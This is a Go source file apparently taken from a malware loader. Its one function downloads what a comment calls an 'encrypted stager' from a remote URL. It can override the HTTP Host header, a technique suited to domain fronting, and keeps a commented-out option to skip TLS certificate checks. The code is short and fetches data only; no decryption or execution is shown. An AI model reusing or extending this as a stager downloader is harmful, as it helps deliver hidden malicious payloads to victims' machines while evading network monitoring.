package crypt

import (
	"fmt"
	"io"
	"log"
	"net/http"
)

func Download(url, host string) []byte {
	// tr := &http.Transport{
	// 	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	// }
	client := http.Client{
		// Transport: tr,
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Printf("this error: %v\n", err)
	}

	if host != "" {
		req.Host = host
	}
	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer res.Body.Close()
	// encrypted stager
	data, _ := io.ReadAll(res.Body)
	return data
}
